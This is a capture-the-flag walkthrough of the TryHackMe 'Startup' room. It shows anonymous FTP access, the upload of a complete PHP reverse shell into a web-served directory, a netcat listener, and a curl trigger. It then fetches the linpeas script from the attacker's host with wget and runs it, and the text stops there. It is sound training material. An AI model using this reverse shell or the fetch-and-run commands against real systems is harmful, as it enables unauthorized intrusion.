# <div align="center">[Startup](https://tryhackme.com/r/room/startup#)</div>

<div align="center">
  <img src="https://github.com/user-attachments/assets/5ec82312-a8a7-4ff9-8642-5c32efafe3f0" height="160"></img>
</div>

## Task 1
Welcome to Spice Hut!
Start Machine
We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

## What is the secret spicy soup recipe?
```
```
## What are the contents of user.txt?

```
```
## What are the contents of root.txt?
```
```

# Enumeration
Let start with Nmap scan to find running services.
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 20:50 IST
Nmap scan report for 10.10.231.18
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.120.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.41 seconds
```
## Here, We can see that there are 3 open ports:
* ### 1. FTP on port 21.
* ### 2. SSH on port 22.
* ### 3. HTTP on port 80.


## Ftp have ```anonymous``` login allowed let take a look at it.
```
death@esther:~$ ftp 10.10.231.18  
Connected to 10.10.231.18.
220 (vsFTPd 3.0.3)
Name (10.10.231.18:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||27770|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 
```
### Let download this files
```
ftp> get important.jpg
local: important.jpg remote: important.jpg
229 Entering Extended Passive Mode (|||49535|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |*************************************************************************************************************************************************|   245 KiB  385.66 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:00 (309.86 KiB/s)

ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||44195|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |*************************************************************************************************************************************************|   208        5.66 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (1.33 KiB/s)

ftp> get .test.log
local: .test.log remote: .test.log
229 Entering Extended Passive Mode (|||53681|)
150 Opening BINARY mode data connection for .test.log (5 bytes).
100% |*************************************************************************************************************************************************|     5      143.61 KiB/s    00:00 ETA
226 Transfer complete.
5 bytes received in 00:00 (0.03 KiB/s)

ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||46356|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||6739|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.
ftp> 
```
## Let read the notice.txt
```
death@esther:~$ cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
## Let see test.log
```
death@esther:~$ cat .test.log 
test
```
## I try to steghide for the image but

<div align="center">
  <img src="https://github.com/user-attachments/assets/cdb936a6-f30c-4772-ac07-05a68d38c6e9" height="250"></img>
</div>

```
death@esther:~$ steghide --extract -sf important.jpg 
Enter passphrase: 
steghide: the file format of the file "important.jpg" is not supported.
```
## As HTTP i open let nevigate to webiste

<div align="center">
  <img src="https://github.com/user-attachments/assets/9f681956-a97c-4a56-89dc-3bea1e499709" height="300"></img>
</div>

# Enumerating Web-directories
```
death@esther:~$ dirsearch -u 10.10.231.18
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/_10.10.231.18/_24-09-28_21-09-33.txt

Target: http://10.10.231.18/

[21:09:34] Starting: 
[21:09:42] 403 -  277B  - /.ht_wsr.txt
[21:09:42] 403 -  277B  - /.htaccess.bak1
[21:09:42] 403 -  277B  - /.htaccess.orig
[21:09:42] 403 -  277B  - /.htaccess.save
[21:09:42] 403 -  277B  - /.htaccess_extra
[21:09:42] 403 -  277B  - /.htaccess.sample
[21:09:42] 403 -  277B  - /.htaccess_sc
[21:09:42] 403 -  277B  - /.htaccessBAK
[21:09:42] 403 -  277B  - /.htaccess_orig
[21:09:42] 403 -  277B  - /.htaccessOLD
[21:09:42] 403 -  277B  - /.htaccessOLD2
[21:09:42] 403 -  277B  - /.htm
[21:09:42] 403 -  277B  - /.html
[21:09:42] 403 -  277B  - /.htpasswd_test
[21:09:42] 403 -  277B  - /.htpasswds
[21:09:42] 403 -  277B  - /.httr-oauth
[21:09:44] 403 -  277B  - /.php
[21:09:44] 403 -  277B  - /.php3
[21:10:20] 301 -  312B  - /files  ->  http://10.10.231.18/files/
[21:10:20] 200 -  511B  - /files/
[21:10:45] 403 -  277B  - /server-status/
[21:10:45] 403 -  277B  - /server-status

Task Completed
```
## There is directory called files let take a look.

<div align="center">
  <img src="https://github.com/user-attachments/assets/11198d1b-640a-45bd-979b-3ef9d9a2538b" height="300"></img>
</div>

## Its as we saw in FTP so maybe we can add file form ftp to this directory so let upload a reverse shell here.
```
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```
* ## save this with any name use .php extention

 # Gaining Access
 
* ## let login FTP first.
```
death@esther:~$ ftp 10.10.231.18  
Connected to 10.10.231.18.
220 (vsFTPd 3.0.3)
Name (10.10.231.18:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
* ## Let upload this.
```
ftp> put shell.php ftp/shell.php
local: shell.php remote: ftp/shell.php
229 Entering Extended Passive Mode (|||39254|)
150 Ok to send data.
100% |*************************************************************************************************************************************************|  3462       30.01 MiB/s    00:00 ETA
226 Transfer complete.put shell.php ftp/shell.php
3462 bytes sent in 00:00 (10.77 KiB/s)
ftp> 

```
* ## Open netcat in another terminal
```
nc -lnvp 1234
```
## Start The shell
```
curl http://10.10.231.18/files/ftp/shell.php
```
## Here we go !!!
```
death@esther:~$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.231.18 52636
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:38:56 up  1:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## Swape shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## Here i found a recepie.txt
```
www-data@startup:/$ ls -la
ls -la
total 100
drwxr-xr-x  25 root     root      4096 Sep 28 15:18 .
drwxr-xr-x  25 root     root      4096 Sep 28 15:18 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Sep 28 15:17 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 119 root     root         0 Sep 28 15:17 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       900 Sep 28 16:19 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Sep 28 15:17 sys
drwxrwxrwt   7 root     root      4096 Sep 28 16:44 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
www-data@startup:/$ 
```

## Let get linpease 
* ## Opening python server on my system
```
sudo python3 -m http.server 80
```
* ## Download linpeas.sh
```
cd /dev/shm
```
```
wget http://10.17.120.99/linpeas.sh
```
```
bash linpeas.sh
```
<div align="center">
  <img src="" height="200"></img>
</div>
